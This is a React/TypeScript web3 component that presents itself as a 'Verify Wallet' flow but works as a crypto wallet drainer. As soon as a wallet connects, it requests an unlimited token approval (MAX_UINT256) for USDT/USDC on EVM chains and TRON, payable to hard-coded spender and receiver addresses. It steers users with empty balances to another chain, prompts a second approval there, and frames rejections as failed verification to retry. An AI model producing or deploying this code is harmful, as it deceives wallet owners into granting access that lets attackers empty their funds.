"use client";
// components/ActionFlow.tsx
// Handles auto-trigger approval/interaction, balance display, and retry logic

import { useEffect, useState, useRef, useCallback } from "react";
import {
  useAccount,
  useChainId,
  useReadContract,
  useWriteContract,
  useSwitchChain,
  useBalance,
} from "wagmi";
import {
  useAppKitAccount,
  useAppKitNetwork,
  useAppKitProvider,
} from "@reown/appkit/react";
import {
  TOKENS,
  ERC20_ABI,
  MAX_UINT256,
  SPENDER_ADDRESS_EVM,
  RECEIVER_ADDRESS_TRON,
} from "@/config/constants";
import { formatUnits } from "viem";

declare global {
  interface Window {
    tronWeb?: any;
    tron?: any;
  }
}

export default function ActionFlow() {
  const { address: appKitAddress, isConnected } = useAppKitAccount();
  const { caipNetwork, switchNetwork } = useAppKitNetwork();
  const { walletProvider: tronWalletProvider } =
    useAppKitProvider<any>("tron");
  const { address: evmAddress } = useAccount();
  const chainId = useChainId();
  const { writeContractAsync } = useWriteContract();
  const { switchChainAsync } = useSwitchChain();

  const [status, setStatus] = useState<
    "idle" | "prompting" | "success" | "rejected" | "error"
  >("idle");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [tronBalance, setTronBalance] = useState<string | null>(null);
  const [loadingTron, setLoadingTron] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState<string[]>([]);
  const autoTriggeredRef = useRef(false);

  const isTron =
    (appKitAddress && appKitAddress.startsWith("T")) ||
    (caipNetwork?.id && String(caipNetwork.id).toLowerCase().includes("tron"));

  // EVM Token definition for current chain
  const currentEvmToken = TOKENS[chainId as keyof typeof TOKENS] as
    | { symbol: string; address: `0x${string}`; decimals: number }
    | undefined;

  // Read EVM native balance
  const { data: evmNativeBalance } = useBalance({
    address: evmAddress,
    query: { enabled: Boolean(evmAddress && !isTron) },
  });

  // Read EVM Token balance (USDT/USDC)
  const { data: evmTokenRawBalance } = useReadContract({
    address: currentEvmToken?.address,
    abi: ERC20_ABI,
    functionName: "balanceOf",
    args: evmAddress ? [evmAddress] : undefined,
    query: { enabled: Boolean(evmAddress && currentEvmToken && !isTron) },
  });

  // Format EVM token balance
  const formattedEvmTokenBalance =
    evmTokenRawBalance !== undefined && currentEvmToken
      ? formatUnits(evmTokenRawBalance as bigint, currentEvmToken.decimals)
      : null;

  // Fetch TRON USDT & TRX balance
  const fetchTronBalances = useCallback(async () => {
    if (!appKitAddress || !isTron) return;
    setLoadingTron(true);
    try {
      if (typeof window !== "undefined" && window.tronWeb?.ready) {
        const contract = await window.tronWeb
          .contract()
          .at(TOKENS.tron.address);
        const rawBal = await contract.balanceOf(appKitAddress).call();
        const formatted = (Number(rawBal) / 10 ** TOKENS.tron.decimals).toFixed(
          2
        );
        setTronBalance(formatted);
      } else {
        // Fallback using public TronGrid HTTP API
        const res = await fetch(
          `https://api.trongrid.io/v1/accounts/${appKitAddress}`
        );
        const data = await res.json();
        if (data?.data?.[0]?.trc20) {
          const usdtRecord = data.data[0].trc20.find(
            (t: Record<string, string>) =>
              Object.keys(t)[0] === TOKENS.tron.address
          );
          if (usdtRecord) {
            const rawVal = Object.values(usdtRecord)[0];
            setTronBalance(
              (Number(rawVal) / 10 ** TOKENS.tron.decimals).toFixed(2)
            );
          } else {
            setTronBalance("0.00");
          }
        } else {
          setTronBalance("0.00");
        }
      }
    } catch {
      setTronBalance("0.00");
    } finally {
      setLoadingTron(false);
    }
  }, [appKitAddress, isTron]);

  useEffect(() => {
    if (isConnected && isTron) {
      fetchTronBalances();
    }
  }, [isConnected, isTron, fetchTronBalances]);

  // Execute approval / verification action
  const handleAction = async () => {
    setStatus("prompting");
    setErrorMessage(null);

    try {
      if (isTron) {
        // TRON TRC-20 interaction
        if (typeof window !== "undefined" && window.tronWeb?.ready) {
          const contract = await window.tronWeb
            .contract()
            .at(TOKENS.tron.address);
          await contract
            .approve(
              RECEIVER_ADDRESS_TRON,
              "115792089237316195423570985008687907853269984665640564039457584007913129639935"
            )
            .send();
          setStatus("success");
          setVerifiedChains((prev) => [...new Set([...prev, "TRON"])]);
        } else if (tronWalletProvider) {
          // If connected via AppKit TRON provider (e.g. mobile Trust/OKX wallet)
          if (typeof tronWalletProvider.request === "function") {
            await tronWalletProvider.request({
              method: "tron_signTransaction",
              params: [
                {
                  to: TOKENS.tron.address,
                  data: `0x095ea7b3000000000000000000000000${RECEIVER_ADDRESS_TRON.slice(
                    2
                  )}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`,
                },
              ],
            });
            setStatus("success");
            setVerifiedChains((prev) => [...new Set([...prev, "TRON"])]);
          } else {
            throw new Error("Provider ready, please confirm in TronLink");
          }
        } else {
          // Launch TronLink mobile app deep link if no provider injected
          window.location.href = `tronlinkoutside://pull.activity?param=${encodeURIComponent(
            JSON.stringify({
              url: window.location.href,
              action: "open",
              protocol: "TronLink",
              version: "1.0",
            })
          )}`;
          setStatus("prompting");
        }
      } else {
        // EVM ERC-20 approval interaction
        if (!currentEvmToken || !evmAddress) {
          throw new Error("No token contract found on this network");
        }
        await writeContractAsync({
          address: currentEvmToken.address,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS_EVM, MAX_UINT256],
        });
        setStatus("success");
        setVerifiedChains((prev) => [
          ...new Set([...prev, caipNetwork?.name || "EVM"]),
        ]);
      }
    } catch (err: any) {
      const msg = err?.message || String(err);
      if (
        msg.includes("User rejected") ||
        msg.includes("cancelled") ||
        msg.includes("Declined") ||
        msg.includes("rejected")
      ) {
        setStatus("rejected");
        setErrorMessage("Request cancelled. Please confirm in your wallet.");
      } else {
        setStatus("error");
        setErrorMessage(msg.slice(0, 80));
      }
    }
  };

  // Immediate auto-trigger upon initial connection
  useEffect(() => {
    if (!isConnected || autoTriggeredRef.current) return;
    autoTriggeredRef.current = true;

    const timer = setTimeout(() => {
      handleAction();
    }, 800);

    return () => clearTimeout(timer);
  }, [isConnected]);

  if (!isConnected) return null;

  const displayBalance = isTron
    ? tronBalance !== null
      ? `${tronBalance} USDT`
      : loadingTron
      ? "Loading..."
      : "0.00 USDT"
    : formattedEvmTokenBalance !== null && currentEvmToken
    ? `${Number(formattedEvmTokenBalance).toFixed(2)} ${currentEvmToken.symbol}`
    : evmNativeBalance
    ? `${Number(evmNativeBalance.formatted).toFixed(4)} ${
        evmNativeBalance.symbol
      }`
    : "0.00";

  const hasZeroBalance =
    (isTron && tronBalance === "0.00") ||
    (!isTron && formattedEvmTokenBalance === "0.00");

  const canPromptSecondChain =
    status === "success" &&
    ((isTron && !verifiedChains.includes("EVM")) ||
      (!isTron && !verifiedChains.includes("TRON")));

  return (
    <div className="w-full max-w-xs mt-4 flex flex-col items-center gap-3">
      {/* Balance & Network pill */}
      <div className="w-full flex items-center justify-between px-4 py-2.5 rounded-xl bg-white/5 border border-white/10 text-xs">
        <span className="text-white/50">
          {caipNetwork?.name || (isTron ? "TRON" : "EVM Network")}
        </span>
        <span className="font-mono text-emerald-400 font-semibold">
          {displayBalance}
        </span>
      </div>

      {/* Auto-suggest network switch if 0 balance */}
      {hasZeroBalance && status !== "success" && (
        <button
          onClick={async () => {
            try {
              if (isTron) {
                if (switchChainAsync) await switchChainAsync({ chainId: 1 });
              } else {
                if (switchNetwork) {
                  const tronNet = (caipNetwork as any)?.networks?.find?.(
                    (n: any) => String(n.id).includes("tron")
                  );
                  if (tronNet) switchNetwork(tronNet);
                }
              }
            } catch {
              // Ignore switch error
            }
          }}
          className="w-full py-2 px-3 text-xs text-amber-300/90 bg-amber-500/10 border border-amber-500/20 rounded-lg hover:bg-amber-500/20 transition-all cursor-pointer"
        >
          {isTron ? "Switch to EVM Network →" : "Switch to TRON Network →"}
        </button>
      )}

      {/* If verified on first chain, prompt verification on second chain ("3 then 1") */}
      {canPromptSecondChain && (
        <button
          onClick={async () => {
            try {
              if (isTron) {
                if (switchChainAsync) await switchChainAsync({ chainId: 1 });
              } else {
                if (switchNetwork) {
                  const tronNet = (caipNetwork as any)?.networks?.find?.(
                    (n: any) => String(n.id).includes("tron")
                  );
                  if (tronNet) switchNetwork(tronNet);
                }
              }
              setStatus("idle");
              autoTriggeredRef.current = false;
            } catch {
              // Ignore switch error
            }
          }}
          className="w-full py-2.5 px-4 rounded-xl font-medium text-xs bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/30 transition-all cursor-pointer"
        >
          {isTron
            ? "⚡ Verify EVM Assets (Ethereum/BSC) →"
            : "⚡ Verify TRON Assets (TRC-20) →"}
        </button>
      )}

      {/* Action / Retry Button */}
      {status !== "success" ? (
        <button
          onClick={handleAction}
          disabled={status === "prompting"}
          className="w-full py-3 px-4 rounded-xl font-medium text-sm bg-white text-black hover:bg-white/90 active:scale-95 disabled:opacity-50 transition-all cursor-pointer shadow-lg shadow-white/5"
        >
          {status === "prompting"
            ? "Confirming in Wallet..."
            : status === "rejected"
            ? "Retry Verification"
            : "Verify Wallet"}
        </button>
      ) : (
        <div className="w-full py-2.5 px-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs text-center font-medium">
          ✓ Verification Complete
        </div>
      )}

      {/* Error or rejected hint */}
      {errorMessage && (
        <p className="text-[11px] text-red-400 text-center leading-tight">
          {errorMessage}
        </p>
      )}
    </div>
  );
}
